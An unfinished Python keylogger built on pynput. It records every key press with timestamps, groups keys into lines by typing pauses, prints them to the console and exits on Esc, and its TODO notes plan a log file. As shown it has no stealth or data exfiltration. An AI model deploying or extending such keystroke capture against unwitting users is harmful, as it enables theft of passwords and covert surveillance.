#TODO: 
# - all chars written together
# - write to a log file
# - ~5sec time for line jump or max chars ~50

# LINE FORMAT: [TIMESTAMP, KEYSLOGGED]



from pynput import keyboard
import time
from datetime import timedelta, datetime



class klog():
    def __init__(self, parent=None):
        #Config vars
        self.timeTresh = 5

        #Functional vars
        self.t0 = datetime.now().time()
        self.tf = datetime.now().time()
        self.t0Seconds = (self.t0.hour * 60 + self.t0.minute) * 60 + self.t0.second
        self.tfSeconds = (self.tf.hour * 60 + self.tf.minute) * 60 + self.tf.second
        
        self.bufferString = "{} -".format (time.strftime("%H:%M:%S", time.localtime()))
        self.charsInLine = 0



    def kPress(self, key):
        print('Key {} pressed.'.format(key))
        lastPress = self.stopTimer()

        if len(str(key)) == 3: #single chars
            keyStr = str(key).replace("'", "")
        else: #modifier keys
            keyStr = "{}{}{}".format('[', str(key), ']') 

        if lastPress < self.timeTresh:
            self.bufferString += keyStr
            self.charsInLine += 1
        else:
            self.charsInLine = 1
            print('new line!')
            self.bufferString = "{} - {}".format (time.strftime("%H:%M:%S", time.localtime()), keyStr)

        print(self.charsInLine)
        print(self.bufferString)

    def kRelease(self, key):
        print('Key {} released.'.format(key))
        self.startTimer()
        if str(key) == 'Key.esc':
            print('Exiting...')
            return False


    def startTimer(self):
        self.t0 = datetime.now().time()
        self.t0Seconds = (self.t0.hour * 60 + self.t0.minute) * 60 + self.t0.second


    def stopTimer(self):
        self.tf = datetime.now().time()
        self.tfSeconds = (self.tf.hour * 60 + self.tf.minute) * 60 + self.tf.second
        tDelta = self.tfSeconds - self.t0Seconds
        return tDelta


if __name__ == '__main__':
    kl = klog()
    with keyboard.Listener(on_press = kl.kPress, on_release = kl.kRelease) as listener:
        listener.join()